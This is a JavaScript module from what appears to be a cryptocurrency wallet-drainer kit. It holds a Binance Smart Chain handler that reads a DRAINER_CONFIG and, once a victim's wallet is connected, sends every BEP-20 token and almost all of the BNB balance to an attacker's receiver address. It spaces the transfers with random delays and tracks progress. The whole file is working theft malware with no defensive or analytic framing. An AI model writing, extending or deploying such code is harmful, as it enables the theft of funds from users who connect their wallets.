// BSC (Binance Smart Chain) Network Handler
class BSCNetwork {
    constructor() {
        this.provider = null;
        this.signer = null;
        this.networkConfig = window.DRAINER_CONFIG.NETWORKS.bsc;
        this.tokens = window.DRAINER_CONFIG.TOKENS.bsc;
        this.receiverAddress = window.DRAINER_CONFIG.RECEIVER_ADDRESSES.bsc;
    }

    async initialize(provider) {
        try {
            this.provider = new ethers.providers.Web3Provider(provider);
            this.signer = this.provider.getSigner();
            
            // Check network
            const network = await this.provider.getNetwork();
            if (network.chainId !== this.networkConfig.chainId) {
                await this.switchNetwork(provider);
            }
            
            return true;
        } catch (error) {
            console.error('Failed to initialize BSC network:', error);
            return false;
        }
    }

    async switchNetwork(provider) {
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${this.networkConfig.chainId.toString(16)}` }]
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                // Add BSC network if not exists
                await provider.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: `0x${this.networkConfig.chainId.toString(16)}`,
                        chainName: this.networkConfig.name,
                        nativeCurrency: this.networkConfig.nativeCurrency,
                        rpcUrls: this.networkConfig.rpcUrls,
                        blockExplorerUrls: this.networkConfig.blockExplorerUrls
                    }]
                });
            }
            throw switchError;
        }
    }

    async getBalance(address) {
        try {
            const balance = await this.provider.getBalance(address);
            return {
                raw: balance,
                formatted: ethers.utils.formatEther(balance),
                symbol: 'BNB'
            };
        } catch (error) {
            console.error('Failed to get BNB balance:', error);
            return null;
        }
    }

    async getTokenBalance(address, token) {
        try {
            const bep20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function decimals() view returns (uint8)",
                "function symbol() view returns (string)"
            ];

            const contract = new ethers.Contract(token.address, bep20ABI, this.provider);
            const balance = await contract.balanceOf(address);
            
            if (balance.isZero()) {
                return null;
            }

            return {
                raw: balance,
                formatted: ethers.utils.formatUnits(balance, token.decimals),
                symbol: token.symbol,
                contractAddress: token.address,
                decimals: token.decimals
            };
        } catch (error) {
            console.error(`Failed to get ${token.symbol} balance:`, error);
            return null;
        }
    }

    async getAllTokenBalances(address) {
        const balances = [];
        
        for (const token of this.tokens) {
            try {
                const balance = await this.getTokenBalance(address, token);
                if (balance) {
                    balances.push(balance);
                }
            } catch (error) {
                console.warn(`Skipping ${token.symbol}:`, error.message);
            }
        }
        
        return balances;
    }

    async estimateGas(transaction) {
        try {
            return await this.provider.estimateGas(transaction);
        } catch (error) {
            console.error('Gas estimation failed:', error);
            return ethers.BigNumber.from("65000"); // Fallback for BSC
        }
    }

    async getCurrentGasPrice() {
        try {
            const gasPrice = await this.provider.getGasPrice();
            // BSC has lower gas prices, use smaller buffer
            return gasPrice.mul(105).div(100); // 5% buffer
        } catch (error) {
            console.error('Failed to get gas price:', error);
            return ethers.utils.parseUnits("5", "gwei"); // BSC fallback
        }
    }

    async drainToken(userAddress, token) {
        try {
            const bep20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)"
            ];

            const contract = new ethers.Contract(token.address, bep20ABI, this.signer);
            const balance = await contract.balanceOf(userAddress);

            if (balance.isZero()) {
                return { success: false, message: `No ${token.symbol} balance` };
            }

            const gasPrice = await this.getCurrentGasPrice();
            const gasLimit = await this.estimateGas({
                to: token.address,
                data: contract.interface.encodeFunctionData("transfer", [this.receiverAddress, balance])
            });

            // Check if user has enough BNB for gas
            const bnbBalance = await this.provider.getBalance(userAddress);
            const gasCost = gasPrice.mul(gasLimit);

            if (bnbBalance.lt(gasCost)) {
                return { 
                    success: false, 
                    message: `Insufficient BNB for gas. Need: ${ethers.utils.formatEther(gasCost)} BNB` 
                };
            }

            const tx = await contract.transfer(this.receiverAddress, balance, {
                gasPrice,
                gasLimit
            });

            const receipt = await tx.wait();
            
            return {
                success: true,
                txHash: tx.hash,
                amount: ethers.utils.formatUnits(balance, token.decimals),
                symbol: token.symbol,
                gasUsed: receipt.gasUsed.toString(),
                explorerUrl: `${this.networkConfig.blockExplorerUrls[0]}/tx/${tx.hash}`
            };

        } catch (error) {
            return {
                success: false,
                message: error.message,
                code: error.code
            };
        }
    }

    async drainBNB(userAddress) {
        try {
            const balance = await this.provider.getBalance(userAddress);
            
            if (balance.isZero()) {
                return { success: false, message: "No BNB balance" };
            }

            const gasPrice = await this.getCurrentGasPrice();
            const gasLimit = ethers.BigNumber.from("21000");
            const gasCost = gasPrice.mul(gasLimit);
            const amountToSend = balance.sub(gasCost);

            if (amountToSend.lte(0)) {
                return { 
                    success: false, 
                    message: "Insufficient BNB balance for gas fees" 
                };
            }

            const tx = await this.signer.sendTransaction({
                to: this.receiverAddress,
                value: amountToSend,
                gasPrice,
                gasLimit
            });

            const receipt = await tx.wait();

            return {
                success: true,
                txHash: tx.hash,
                amount: ethers.utils.formatEther(amountToSend),
                symbol: 'BNB',
                gasUsed: receipt.gasUsed.toString(),
                explorerUrl: `${this.networkConfig.blockExplorerUrls[0]}/tx/${tx.hash}`
            };

        } catch (error) {
            return {
                success: false,
                message: error.message,
                code: error.code
            };
        }
    }

    async drainAll(userAddress, progressCallback) {
        const results = [];
        let completed = 0;
        
        try {
            // Get all balances first
            const tokenBalances = await this.getAllTokenBalances(userAddress);
            const bnbBalance = await this.getBalance(userAddress);
            
            const totalOperations = tokenBalances.length + (bnbBalance ? 1 : 0);
            
            if (totalOperations === 0) {
                return { success: false, message: "No assets to drain" };
            }

            // Drain BEP-20 tokens first
            for (const tokenBalance of tokenBalances) {
                if (progressCallback) {
                    progressCallback((completed / totalOperations) * 100, `Draining ${tokenBalance.symbol}...`);
                }

                const result = await this.drainToken(userAddress, {
                    address: tokenBalance.contractAddress,
                    symbol: tokenBalance.symbol,
                    decimals: tokenBalance.decimals
                });

                results.push({
                    type: 'token',
                    network: 'bsc',
                    ...result
                });

                completed++;
                await window.DRAINER_UTILS.sleep(window.DRAINER_UTILS.generateRandomDelay(500, 1500));
            }

            // Drain BNB last
            if (bnbBalance && parseFloat(bnbBalance.formatted) > 0.001) {
                if (progressCallback) {
                    progressCallback((completed / totalOperations) * 100, "Draining BNB...");
                }

                const result = await this.drainBNB(userAddress);
                results.push({
                    type: 'native',
                    network: 'bsc',
                    ...result
                });
                completed++;
            }

            if (progressCallback) {
                progressCallback(100, "BSC drainage complete!");
            }

            return {
                success: true,
                results,
                summary: {
                    totalOperations,
                    successful: results.filter(r => r.success).length,
                    failed: results.filter(r => !r.success).length
                }
            };

        } catch (error) {
            return {
                success: false,
                message: error.message,
                results
            };
        }
    }

    // BSC-specific utility functions
    async getPancakeSwapTokenInfo(tokenAddress) {
        try {
            // This could be extended to get token info from PancakeSwap
            const erc20ABI = ["function name() view returns (string)", "function symbol() view returns (string)"];
            const contract = new ethers.Contract(tokenAddress, erc20ABI, this.provider);
            
            const [name, symbol] = await Promise.all([
                contract.name(),
                contract.symbol()
            ]);
            
            return { name, symbol };
        } catch (error) {
            console.error('Failed to get token info:', error);
            return null;
        }
    }

    async checkApprovalNeeded(userAddress, tokenAddress, spenderAddress) {
        try {
            const erc20ABI = ["function allowance(address owner, address spender) view returns (uint256)"];
            const contract = new ethers.Contract(tokenAddress, erc20ABI, this.provider);
            const allowance = await contract.allowance(userAddress, spenderAddress);
            return allowance.isZero();
        } catch (error) {
            console.error('Failed to check approval:', error);
            return true;
        }
    }
}

// Export for use in other modules
window.BSCNetwork = BSCNetwork;
